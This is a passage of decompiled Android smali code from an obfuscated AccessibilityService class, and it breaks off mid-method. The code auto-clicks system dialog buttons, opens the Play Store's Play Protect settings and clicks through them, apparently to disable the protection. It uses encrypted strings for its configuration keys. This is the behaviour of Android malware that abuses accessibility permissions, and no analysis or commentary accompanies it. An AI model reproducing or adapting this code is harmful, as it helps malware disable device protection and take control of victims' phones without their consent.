    invoke-static {v0, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1
    sput-object v0, Ls0/c;->e:Landroid/content/Context;

    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v1, :cond_0

    const-string v1, "settings"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_0
    const/4 v0, 0x1

    .line 2
    sput-boolean v0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->q:Z

    return-void
.end method

.method public onDestroy()V
    .locals 1

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onDestroy()V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->q:Z

    return-void
.end method

.method public onInterrupt()V
    .locals 1

    const-string v0, "MEpmM2hoWnpjZkpabEJoZUVNTlpDUT09OjphMWJBdjhubFhMOU9oeGNjUkR0TWpBPT0="

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 1
    sget-object v0, Lb0/b;->a:Lb0/b;

    return-void
.end method

.method public onRebind(Landroid/content/Intent;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->onRebind(Landroid/content/Intent;)V

    const/4 p1, 0x1

    sput-boolean p1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->q:Z

    return-void
.end method

.method public onServiceConnected()V
    .locals 3

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    :try_start_0
    const-string v0, "Q2s5T0NEWURaNm5yUHozZWpZdXlKUGtuNkFEQytMNkhPZXRCVENoZEtFWT06OndnajdFWm9idUVFSzNUcHgvd2FrWFE9PQ=="

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 1
    sget-object v0, Lb0/b;->a:Lb0/b;

    const/4 v0, 0x0

    :cond_0
    const/4 v1, 0x1

    add-int/2addr v0, v1

    .line 2
    invoke-virtual {p0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/4 v1, 0x4

    if-le v0, v1, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/high16 v2, 0x10000

    invoke-virtual {v1, v0, v2}, Landroid/content/pm/PackageManager;->resolveActivity(Landroid/content/Intent;I)Landroid/content/pm/ResolveInfo;

    move-result-object v0

    const/4 v1, 0x0

    if-nez v0, :cond_1

    goto :goto_0

    :cond_1
    iget-object v0, v0, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    if-nez v0, :cond_2

    goto :goto_0

    :cond_2
    iget-object v1, v0, Landroid/content/pm/ActivityInfo;->packageName:Ljava/lang/String;

    :goto_0
    iput-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->i:Ljava/lang/String;

    invoke-static {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo$a;->a(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public onUnbind(Landroid/content/Intent;)Z
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->q:Z

    invoke-super {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->onUnbind(Landroid/content/Intent;)Z

    move-result p1

    return p1
.end method

.method public final p(Ljava/lang/String;Ljava/lang/String;Z)Z
    .locals 2

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_1

    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ":id/"

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    if-nez p1, :cond_1

    goto :goto_1

    :cond_1
    invoke-interface {p1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_2
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result p2

    if-eqz p2, :cond_3

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object p2

    move-object v0, p2

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_2

    goto :goto_0

    :cond_3
    const/4 p2, 0x0

    :goto_0
    check-cast p2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez p2, :cond_4

    :goto_1
    const/4 p1, 0x0

    return p1

    :cond_4
    invoke-virtual {p0, p2, p3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    const/4 p1, 0x1

    return p1
.end method

.method public final q(IILandroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 3

    if-nez p3, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_1

    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p3, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v0, p1, p2}, Landroid/graphics/Rect;->contains(II)Z

    move-result p1

    if-eqz p1, :cond_4

    .line 1
    invoke-virtual {p0, p3, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    goto :goto_1

    .line 2
    :cond_1
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p3, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v0, p1, p2}, Landroid/graphics/Rect;->contains(II)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 3
    invoke-virtual {p0, p3, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 4
    :cond_2
    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    if-lez v0, :cond_4

    :goto_0
    add-int/lit8 v2, v1, 0x1

    invoke-virtual {p3, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {p0, p1, p2, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->q(IILandroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-lt v2, v0, :cond_3

    goto :goto_1

    :cond_3
    move v1, v2

    goto :goto_0

    :catch_0
    :cond_4
    :goto_1
    return-void
.end method

.method public final r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z
    .locals 2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    invoke-virtual {p0, p1, p2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    return v1

    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const-string v0, "item.parent"

    :goto_0
    invoke-static {p1, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, p1, p2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    return v1

    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const-string v0, "item.parent.parent"

    goto :goto_0

    :cond_2
    const/4 p1, 0x0

    return p1
.end method

.method public final s()V
    .locals 6

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_0
    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->i:Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "btnOk"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v1, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_1

    goto :goto_1

    :cond_1
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_1
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    if-nez v0, :cond_2

    goto :goto_3

    :cond_2
    const-string v3, "android:id/button1"

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-nez v0, :cond_3

    goto :goto_3

    :cond_3
    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_4
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_5

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v4, v3

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v4

    if-eqz v4, :cond_4

    goto :goto_2

    :cond_5
    move-object v3, v1

    :goto_2
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_6

    goto :goto_3

    .line 1
    :cond_6
    invoke-virtual {p0, v3, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 2
    :goto_3
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_7

    goto :goto_4

    :cond_7
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_4
    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 3
    sget-object v0, Lb0/b;->C:Lj0/b;

    check-cast v0, Lj0/e;

    invoke-virtual {v0}, Lj0/e;->a()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Set;

    .line 4
    invoke-interface {v0}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_8
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_d

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_9

    :goto_5
    move-object v4, v1

    goto :goto_7

    :cond_9
    invoke-virtual {v4, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-nez v3, :cond_a

    goto :goto_5

    :cond_a
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_b
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_c

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    move-object v5, v4

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v5

    if-eqz v5, :cond_b

    goto :goto_6

    :cond_c
    move-object v4, v1

    :goto_6
    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_7
    if-eqz v4, :cond_8

    .line 5
    invoke-virtual {p0, v4, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 6
    :cond_d
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_e

    goto :goto_8

    :cond_e
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_8
    return-void
.end method

.method public final t(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)V
    .locals 12

    const-string v0, "dDF0VjVmbnc5OU1WeTl6MVRDNE9sdz09OjpwZzVxQUpvbkJSYUFuQytMVzVKZStBPT0="

    const-string v1, ""

    if-nez p1, :cond_0

    return-void

    .line 1
    :cond_0
    :try_start_0
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {p1, v2, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_1

    move-object p1, v1

    .line 2
    :cond_1
    const-string v2, "1"

    invoke-static {p1, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1a

    iget-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    const-string v2, "com.android.vending"

    invoke-static {p1, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const-string v2, "node"

    const-string v3, "QXA2YVgwV0dsQ0tTbjd4aGFucWNZUT09OjpQa1gvZFlRR0FmVXIzcDV4L0ErMXFRPT0="

    const/4 v4, 0x0

    if-eqz p1, :cond_19

    :try_start_1
    iget-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    const-string v5, "1"

    invoke-static {p1, v5}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    const/4 v5, 0x0

    const/4 v6, 0x1

    if-eqz p1, :cond_d

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-nez p1, :cond_2

    goto :goto_0

    :cond_2
    const-string v7, "Play"

    invoke-virtual {p1, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    if-nez p1, :cond_3

    :goto_0
    move v7, v4

    goto :goto_2

    :cond_3
    invoke-interface {p1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object p1

    move v7, v4

    :goto_1
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_4

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    const-string v8, "it"

    invoke-static {v7, v8}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v7, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    move v7, v6

    goto :goto_1

    :cond_4
    :goto_2
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const-string v8, "android:id/button1"

    invoke-virtual {p1, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_5

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {p1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 3
    invoke-virtual {p0, p1, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 4
    const-string p1, "0"

    iput-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    const-string p1, "0"

    .line 5
    sget-object v8, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v8

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-interface {v8, v9, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v8}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 6
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g()V

    :cond_5
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 7
    sget-object p1, Lb0/b;->D:Lj0/b;

    check-cast p1, Lj0/e;

    invoke-virtual {p1}, Lj0/e;->a()Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Ljava/util/Set;

    .line 8
    invoke-interface {p1}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_6
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_b

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    if-nez v9, :cond_7

    goto :goto_3

    :cond_7
    invoke-virtual {v9, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_8

    :goto_3
    move-object v9, v5

    goto :goto_5

    :cond_8
    invoke-interface {v8}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :cond_9
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v9

    if-eqz v9, :cond_a

    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v9

    move-object v10, v9

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v10

    if-eqz v10, :cond_9

    goto :goto_4

    :cond_a
    move-object v9, v5

    :goto_4
    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_5
    if-eqz v9, :cond_6

    .line 9
    invoke-virtual {p0, v9, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 10
    iput-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    const-string p1, "0"

    .line 11
    sget-object v8, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v8

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-interface {v8, v9, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v8}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 12
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 13
    :cond_b
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-interface {p1, v8, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_c

    move-object p1, v1

    .line 14
    :cond_c
    const-string v8, "1"

    invoke-static {p1, v8}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_d

    if-eqz v7, :cond_d

    iput-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    const-string p1, "0"

    .line 15
    sget-object v7, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v7}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v7}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v7

    invoke-static {v3}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v7, v8, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v7}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 16
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 17
    :cond_d
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {p1, v7, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_e

    move-object p1, v1

    .line 18
    :cond_e
    const-string v7, "1"

    invoke-static {p1, v7}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_12

    const/4 p1, 0x3

    new-array p1, p1, [Ljava/lang/String;

    const-string v7, "com.android.vending:id/toolbar_item_play_protect_settings"

    aput-object v7, p1, v4

    const-string v7, "com.android.vending:id/play_protect_settings"

    aput-object v7, p1, v6

    const-string v6, "android:id/button1"

    const/4 v7, 0x2

    aput-object v6, p1, v7

    move v6, v4

    :goto_6
    add-int/lit8 v8, v6, 0x1

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    aget-object v10, p1, v6

    invoke-virtual {v9, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v9

    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :cond_f
    :goto_7
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_10

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v10, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 19
    invoke-virtual {p0, v10, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 20
    const-string v10, "1"

    iput-object v10, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    aget-object v10, p1, v6

    const-string v11, "android:id/button1"

    invoke-static {v10, v11}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_f

    const-string v10, "0"

    iput-object v10, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g()V

    goto :goto_7

    :cond_10
    if-le v8, v7, :cond_11

    goto :goto_8

    :cond_11
    move v6, v8

    goto :goto_6

    .line 21
    :cond_12
    :goto_8
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_13

    goto :goto_9

    :cond_13
    move-object v1, p1

    .line 22
    :goto_9
    const-string p1, "1"

    invoke-static {v1, p1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_19

    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 23
    sget-object p1, Lb0/b;->D:Lj0/b;

    check-cast p1, Lj0/e;

    invoke-virtual {p1}, Lj0/e;->a()Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Ljava/util/Set;

    .line 24
    invoke-interface {p1}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :goto_a
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_19

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_14

    goto :goto_a

    :cond_14
